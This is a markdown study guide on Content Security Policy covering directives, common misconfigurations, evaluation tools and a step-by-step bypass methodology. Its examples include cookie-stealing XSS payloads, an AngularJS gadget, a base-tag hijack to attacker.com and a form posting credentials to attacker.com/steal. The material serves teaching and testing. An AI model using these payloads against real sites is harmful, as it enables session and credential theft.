# 12 - CSP Bypass Fundamentals & Weak Configurations

## Overview

Content Security Policy (CSP) is a browser security mechanism that restricts the sources from which resources (scripts, styles, images, etc.) can be loaded and executed. Despite being the most robust defense against XSS, CSP is frequently misconfigured in production, creating exploitable weaknesses. This document covers the full CSP specification, common misconfigurations, evaluation methodology, and foundational bypass knowledge.

---

## 1. CSP Delivery Mechanisms

### HTTP Response Header (Primary)

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

- Enforced **before** any content is parsed or rendered
- Strongest delivery method; recommended for production
- Multiple CSP headers are combined using **intersection** (most restrictive union)

### Meta Tag (Secondary)

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

- Parsed during HTML parsing; vulnerable to injection **before** the tag
- Cannot set `frame-ancestors`, `report-uri`, or `sandbox` directives
- If injected HTML precedes the meta tag, a race condition can allow bypass
- Source: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

### Content-Security-Policy-Report-Only

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-violations
```

- Does **not** enforce restrictions; only reports violations
- Used for monitoring and gradual CSP deployment
- **Critical misconfiguration**: deploying Report-Only in production thinking it enforces policy
- Attackers can check for this header to confirm CSP is not actually enforced

---

## 2. Complete CSP Directive Reference

### Fetch Directives (Resource Loading)

| Directive | Controls | Fallback |
|-----------|----------|----------|
| `default-src` | Fallback for all fetch directives | None (browser default) |
| `script-src` | JavaScript execution | `default-src` |
| `script-src-elem` | `<script>` elements specifically | `script-src` |
| `script-src-attr` | Inline event handlers (`onclick`, etc.) | `script-src` |
| `style-src` | CSS stylesheets | `default-src` |
| `style-src-elem` | `<style>` and `<link rel=stylesheet>` | `style-src` |
| `style-src-attr` | Inline `style=""` attributes | `style-src` |
| `img-src` | Images (`<img>`, CSS `background-image`) | `default-src` |
| `font-src` | Web fonts (`@font-face`) | `default-src` |
| `connect-src` | XHR, Fetch, WebSocket, EventSource | `default-src` |
| `media-src` | `<audio>`, `<video>` | `default-src` |
| `object-src` | `<object>`, `<embed>`, `<applet>` | `default-src` |
| `frame-src` | `<iframe>`, `<frame>` | `child-src` -> `default-src` |
| `child-src` | `<iframe>` + Web Workers | `default-src` |
| `worker-src` | `Worker`, `SharedWorker`, `ServiceWorker` | `child-src` -> `script-src` -> `default-src` |
| `manifest-src` | Web app manifests | `default-src` |
| `prefetch-src` | Prefetch and prerender | `default-src` (deprecated) |

### Navigation Directives

| Directive | Controls |
|-----------|----------|
| `frame-ancestors` | Who can embed this page (`<iframe>`, `<object>`) - replaces X-Frame-Options |
| `form-action` | Where `<form>` can submit data - **does NOT fall back to default-src** |
| `navigate-to` | Where the document can navigate (experimental, limited support) |

### Document Directives

| Directive | Controls |
|-----------|----------|
| `base-uri` | Restricts `<base>` tag URLs - **does NOT fall back to default-src** |
| `sandbox` | Applies sandbox restrictions (like `<iframe sandbox>`) |

### Reporting Directives

| Directive | Purpose |
|-----------|---------|
| `report-uri` | URL to send violation reports (CSP Level 2, deprecated) |
| `report-to` | Reporting API group name (CSP Level 3) |

**Security note**: `form-action` and `base-uri` do NOT fall back to `default-src`. If omitted, they are unrestricted, which is a common and dangerous misconfiguration.

---

## 3. Source Expressions

### Basic Sources

| Expression | Meaning |
|------------|---------|
| `'none'` | Block everything |
| `'self'` | Same origin only (scheme + host + port) |
| `https:` | Any HTTPS URL |
| `data:` | `data:` URI scheme |
| `blob:` | `blob:` URI scheme |
| `mediastream:` | `mediastream:` URI scheme |
| `*.example.com` | Wildcard subdomain matching |
| `https://cdn.example.com` | Specific host |
| `https://cdn.example.com/js/` | Specific path (CSP Level 3) |

### Keyword Sources

| Expression | Meaning | Risk Level |
|------------|---------|------------|
| `'unsafe-inline'` | Allows inline `<script>`, `<style>`, event handlers | **CRITICAL** - defeats CSP for XSS |
| `'unsafe-eval'` | Allows eval(), Function(), setTimeout(string) | **HIGH** - enables code generation attacks |
| `'unsafe-hashes'` | Allows specific inline event handlers by hash | **MEDIUM** - limited to specific handlers |
| `'strict-dynamic'` | Trust propagates to scripts loaded by trusted scripts | **Context-dependent** |
| `'wasm-unsafe-eval'` | Allows WebAssembly compilation | **LOW-MEDIUM** |

### Nonce-Based Sources (CSP Level 2+)

```
Content-Security-Policy: script-src 'nonce-abc123def456'
```

```html
<script nonce="abc123def456">
  // This executes because nonce matches
  console.log("allowed");
</script>
```

- Nonce must be cryptographically random and regenerated per request
- Minimum 128 bits of entropy recommended
- **Bypass risk**: Nonce reuse, nonce leaking via CSS, nonce in cached pages

### Hash-Based Sources (CSP Level 2+)

```
Content-Security-Policy: script-src 'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8='
```

- Hash must match exact script content (whitespace-sensitive)
- Only works for inline scripts, not external resources
- Cannot be used with `strict-dynamic`

### strict-dynamic (CSP Level 3)

```
Content-Security-Policy: script-src 'nonce-random123' 'strict-dynamic'
```

- A nonce-bearing script can dynamically load additional scripts (via `document.createElement('script')`)
- Loaded scripts inherit trust without needing their own nonce
- **Ignores** host-based allowlists (`https://cdn.example.com` is ignored when `strict-dynamic` is present)
- `'unsafe-inline'` is also ignored when `strict-dynamic` is present
- Source: https://www.w3.org/TR/CSP3/#strict-dynamic-usage

---

## 4. CSP Levels and Browser Support

### CSP Level 1 (2012-2015)

- Basic directives: `default-src`, `script-src`, `style-src`, `img-src`, `connect-src`, `font-src`, `object-src`, `media-src`, `frame-src`
- Source expressions: `'none'`, `'self'`, `'unsafe-inline'`, `'unsafe-eval'`, scheme, host
- Supported in all modern browsers

### CSP Level 2 (2015-2018)

- Added: `base-uri`, `child-src`, `form-action`, `frame-ancestors`, `plugin-types`
- Added: Nonce sources (`'nonce-*'`), hash sources (`'sha256-*'`, `'sha384-*'`, `'sha512-*'`)
- Added: `report-uri`
- Supported in all modern browsers

### CSP Level 3 (2018-Present)

- Added: `strict-dynamic`, `unsafe-hashes`, `report-to`
- Added: `script-src-elem`, `script-src-attr`, `style-src-elem`, `style-src-attr`
- Added: `worker-src`, `navigate-to`
- Path-based matching for host sources
- Support varies; `strict-dynamic` well-supported in Chrome, Firefox, Edge

Source: https://caniuse.com/contentsecuritypolicy2

---

## 5. Common Misconfigurations (Exploitable Weaknesses)

### 5.1 `unsafe-inline` in script-src

```
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```

**Impact**: Completely defeats CSP protection against XSS. Any injected `<script>` or event handler executes.

```html
<!-- Bypasses CSP immediately -->
<script>alert(document.cookie)</script>
<img src=x onerror=alert(document.cookie)>
```

**Prevalence**: Found in approximately 87.3% of CSP deployments according to research.
Source: https://blog.compass-security.com/2016/06/content-security-policy-misconfigurations-and-bypasses/

### 5.2 `unsafe-eval` in script-src

```
Content-Security-Policy: script-src 'self' 'unsafe-eval'
```

**Impact**: Allows eval(), Function(), setTimeout("string"), setInterval("string").

```html
<!-- If attacker controls string input passed to dynamic code execution functions -->
<script>
  // Attacker-controlled input reaches Function constructor
  new Function('alert(document.cookie)')();
</script>
```

### 5.3 Overly Broad Whitelists

```
Content-Security-Policy: script-src 'self' *.googleapis.com *.gstatic.com *.google.com
```

**Impact**: These domains host JSONP endpoints and AngularJS, enabling full bypass.

```html
<!-- Load AngularJS from whitelisted CDN -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(document.cookie)')()}}</div>
```

**Dangerous wildcard domains commonly whitelisted**:
- `*.googleapis.com` - hosts Angular, JSONP endpoints
- `*.cloudflare.com` - CDN with user-uploaded content via cdnjs
- `*.amazonaws.com` - S3 buckets with attacker-controlled content
- `*.cloudfront.net` - CDN distributions, attacker can create their own
- `*.azurewebsites.net` - attacker can deploy their own Azure app
- `*.herokuapp.com` - attacker can deploy their own Heroku app
- `*.firebaseapp.com` - attacker can create their own Firebase project
- `*.unpkg.com` / `*.jsdelivr.net` - npm CDNs hosting any published package

Source: https://github.com/google/csp-evaluator/issues/71

### 5.4 Missing `object-src`

```
Content-Security-Policy: script-src 'self'
```

Without explicit `object-src`, it falls back to `default-src`. If `default-src` is permissive or missing, Flash/plugin-based XSS is possible (legacy browsers):

```html
<object data="data:text/html,<script>alert(1)</script>" type="text/html"></object>
```

**Best practice**: Always include `object-src 'none'`.

### 5.5 Missing `base-uri`

```
Content-Security-Policy: script-src 'nonce-abc123' 'strict-dynamic'
```

Without `base-uri` restriction, an attacker can inject `<base href="https://evil.com/">` and hijack all relative script URLs:

```html
<base href="https://attacker.com/">
<!-- Now <script src="/js/app.js"> loads from https://attacker.com/js/app.js -->
```

**Best practice**: Always include `base-uri 'self'` or `base-uri 'none'`.

### 5.6 `data:` in script-src

```
Content-Security-Policy: script-src 'self' data:
```

**Impact**: Direct script execution via data URIs.

```html
<script src="data:text/javascript,alert(document.cookie)"></script>
```

### 5.7 `blob:` in script-src

```
Content-Security-Policy: script-src 'self' blob:
```

**Impact**: Create and execute arbitrary scripts via Blob URLs.

```javascript
const blob = new Blob(['alert(document.cookie)'], {type: 'application/javascript'});
const url = URL.createObjectURL(blob);
const s = document.createElement('script');
s.src = url;
document.body.appendChild(s);
```

### 5.8 Missing `form-action`

```
Content-Security-Policy: default-src 'self'; script-src 'nonce-abc123'
```

Without `form-action`, forms can submit data to any domain, enabling credential theft:

```html
<form action="https://attacker.com/steal" method="POST">
  <!-- existing form inputs will be submitted to attacker -->
</form>
```

Source: https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/

---

## 6. CSP Evaluation Tools

### Google CSP Evaluator

- **URL**: https://csp-evaluator.withgoogle.com/
- **GitHub**: https://github.com/google/csp-evaluator
- Identifies unsafe directives, missing directives, known bypass-able whitelisted domains
- Checks for JSONP endpoints on whitelisted origins
- Rates findings as High / Medium / Low severity
- Available as Chrome extension and Burp Suite plugin

### Browser DevTools

```
# Chrome/Firefox Console - View active CSP
# Look for CSP violations in Console tab (red errors)
# Network tab -> Response Headers -> Content-Security-Policy

# Programmatic check
fetch(location.href).then(r => console.log(r.headers.get('content-security-policy')))
```

### CentralCSP Scanner

- **URL**: https://centralcsp.com/features/scanner
- Online CSP analysis with bypass detection
- Checks for known JSONP endpoints on whitelisted domains
- Source: https://centralcsp.com/features/evaluator

### Burp Suite CSP Auditor

- **Extension**: https://portswigger.net/bappstore/b113bdc1390647b092cb527c0b95116d
- Passive scan for CSP weaknesses during testing
- Identifies missing directives and unsafe source expressions

### Nuclei CSP Templates

```bash
nuclei -u https://target.com -t cves/ -tags csp
```

- ProjectDiscovery's Nuclei includes DAST templates for CSP bypass detection
- YAML-based templates for automated scanning at scale
- Source: https://projectdiscovery.io/blog/csp-bypass-dast-nuclei-templates-v10-1-5

### CSPBypass.com

- **GitHub**: https://github.com/renniepak/CSPBypass
- Catalogs known bypass gadgets per whitelisted domain
- Maps CSP configurations to known bypass payloads
- Source: https://github.com/renniepak/CSPBypass

---

## 7. Step-by-Step CSP Analysis Methodology

### Phase 1: CSP Discovery

```bash
# 1. Retrieve the CSP header
curl -sI https://target.com | grep -i "content-security-policy"

# 2. Check for CSP meta tags (if no header found)
curl -s https://target.com | grep -i "content-security-policy"

# 3. Check if it's Report-Only (non-enforcing)
curl -sI https://target.com | grep -i "content-security-policy-report-only"

# 4. Check for multiple CSP headers (intersection applies)
curl -sI https://target.com | grep -ci "content-security-policy"
```

### Phase 2: Policy Decomposition

1. Parse each directive and its source list
2. Identify the `default-src` fallback value
3. Map which directives are explicitly set vs falling back to `default-src`
4. Note any **missing** critical directives: `object-src`, `base-uri`, `form-action`, `frame-ancestors`

### Phase 3: Source Expression Analysis

For each directive with whitelisted domains:
1. Check for wildcard subdomains (`*.example.com`)
2. Check for overly broad domains (CDNs, cloud providers)
3. Check for `data:`, `blob:`, `'unsafe-inline'`, `'unsafe-eval'`
4. Check for nonce-based or hash-based enforcement
5. Check for `strict-dynamic` and its implications

### Phase 4: Bypass Identification

1. Run CSP through Google CSP Evaluator
2. For each whitelisted domain, search for:
   - JSONP endpoints (see JSONBee: https://github.com/zigoo0/JSONBee)
   - AngularJS or other exploitable libraries on the domain
   - Open redirects on whitelisted domains
   - User-controlled content hosting
3. Check for script gadgets in existing page scripts
4. Test for CSP injection via reflected parameters in headers
5. Verify nonce randomness and per-request regeneration

### Phase 5: Exploit Development

1. Select bypass technique matching identified weakness
2. Craft payload specific to the CSP configuration
3. Test in browser with DevTools Console open for CSP violation reporting
4. Verify exfiltration path (if connect-src is restrictive, use DNS/navigation-based exfiltration)

---

## 8. Vulnerable vs. Secure CSP Examples

### Vulnerable CSP (Multiple Issues)

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' *.googleapis.com *.cloudflare.com data:; style-src 'self' 'unsafe-inline'; img-src *
```

**Issues**:
- `unsafe-inline` + `unsafe-eval` in `script-src` = CSP is useless for XSS
- Wildcard CDN domains allow JSONP/AngularJS bypass
- `data:` in `script-src` allows `data:` URI script execution
- Missing `object-src`, `base-uri`, `form-action`, `frame-ancestors`
- `img-src *` allows image-based exfiltration to any domain

### Secure CSP (Nonce-Based with strict-dynamic)

```
Content-Security-Policy: default-src 'none'; script-src 'nonce-{random}' 'strict-dynamic'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; report-uri /csp-report; report-to csp-endpoint
```

**Strengths**:
- `default-src 'none'` blocks everything not explicitly allowed
- Nonce-based script allowlisting with `strict-dynamic` for dynamic loading
- All critical directives explicitly set
- `base-uri 'none'` prevents base tag injection
- `form-action 'self'` prevents form hijacking
- `object-src 'none'` prevents plugin-based attacks
- `frame-ancestors 'none'` prevents clickjacking
- Reporting enabled for monitoring

---

## References

- W3C CSP Level 3 Specification: https://www.w3.org/TR/CSP3/
- MDN Content Security Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- Google CSP Evaluator: https://csp-evaluator.withgoogle.com/
- OWASP CSP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy
- PortSwigger CSP Bypass Research: https://portswigger.net/research/bypassing-csp-via-dom-clobbering
- HackTricks CSP Bypass: https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html
- Cobalt CSP and Bypasses: https://www.cobalt.io/blog/csp-and-bypasses
- Compass Security CSP Misconfigurations: https://blog.compass-security.com/2016/06/content-security-policy-misconfigurations-and-bypasses/
- BrowserStack CSP Guide: https://www.browserstack.com/guide/csp-bypass
- CSP Evaluator GitHub Issues (googleapis warning): https://github.com/google/csp-evaluator/issues/71

---
## [2024-2026 Research Update]

### Nonce Leakage via bfcache (Back/Forward Cache)

A technique disclosed circa mid-2025 combines HTML injection with browser caching to recover valid CSP nonces. When a page carrying a nonce is cached in bfcache or disk cache, an attacker who can inject HTML obtains the nonce from the cached response and reuses it.

**Attack flow:**
1. Page with nonce-based CSP is loaded (CSS injection or HTML injection is present)
2. CSS attribute selectors leak the nonce character by character from DOM or `<meta>` tags
3. The nonce is cached by the browser's back/forward cache (bfcache) or disk cache
4. Attacker navigates user away, then triggers `history.back()` or similar navigation
5. bfcache restores the page with the same nonce value from the cached response
6. Attacker's injected payload uses the known cached nonce for script execution

**Conditions required:**
- The nonce must not change on bfcache restoration (some frameworks regenerate, some do not)
- The XSS payload must be persistent or reflected in a cached response
- The cache restoration must use the same nonce as the one leaked

**Defense:** Avoid caching pages with nonces (set `Cache-Control: no-store`), ensure nonces are truly single-use per HTTP response, and use `Cache-Control: no-back-forward-cache` where supported.

**Source:** https://www.webasha.com/blog/what-is-the-new-technique-that-bypasses-content-security-policy-using-html-injection-and-browser-caching
**Source:** https://jorianwoltjer.com/blog/p/research/nonce-csp-bypass-using-disk-cache

### base-uri Hijacking (Expanded Guidance)

A missing `base-uri` directive allows an attacker with HTML injection to insert a `<base>` tag that redirects relative script loads to an attacker-controlled server. This is especially devastating with nonce-based CSP: the nonce validates the existing `<script>` element, but the `src` resolves via the injected base URL.

**Key details:**
- `base-uri` does NOT fall back to `default-src` -- if omitted, it is unrestricted
- Even `strict-dynamic` does not protect against base-uri hijacking when the trusted script is loaded via a relative path
- The attack works by injecting `<base href="https://attacker.com/">` BEFORE existing script tags in the HTML

```html
<!-- Original page has: -->
<script nonce="abc123" src="/js/app.js"></script>

<!-- Attacker injects BEFORE: -->
<base href="https://attacker.com/">

<!-- Result: Browser loads https://attacker.com/js/app.js with valid nonce abc123 -->
<!-- With strict-dynamic, any scripts dynamically created by the loaded script also execute -->
```

**Best practice:** Always include `base-uri 'self'` or `base-uri 'none'` in all CSP policies.

**Source:** https://git.koelner.dedyn.io/coelner/hacktricks/raw/commit/9d3209aeae061bbf37be83c2442cc76bfa47c147/pentesting-web/content-security-policy-csp-bypass/README.md

### strict-dynamic Gadgets (2024-2026 Research)

Under `strict-dynamic`, dynamically created scripts inherit trust from the parent nonce-bearing script. The following gadget patterns have been identified:

1. **DOM Clobbering + strict-dynamic:** A trusted nonced script reads a URL from the DOM (e.g., `document.getElementById('config').getAttribute('data-url')`). Attacker injects an HTML element that clobbers this DOM lookup, causing the trusted script to load attacker-controlled code. Since `strict-dynamic` trusts dynamically created scripts from nonced scripts, full execution is achieved.

2. **Webpack AutoPublicPathRuntimeModule:** Webpack's chunk loading references `document.currentScript` to determine the base URL. DOM clobbering of `document.currentScript` redirects chunk loading to attacker-controlled servers. The loaded chunks execute under `strict-dynamic` trust.

3. **Rollup bundler DOM clobbering (CVE-2024-47068):** Rollup-bundled scripts contained auto-generated module code referencing DOM-clobberable properties for base URL resolution.

4. **RequireJS data-main:** RequireJS reads the `data-main` attribute to load the initial module from an arbitrary URL. Since RequireJS itself is loaded from a whitelisted/nonced source, the loaded module executes under `strict-dynamic`.

**Source:** https://buer.haus/2024/02/23/go-go-xss-gadgets-chaining-a-dom-clobbering-exploit-in-the-wild/
**Source:** https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986
**Source:** https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm
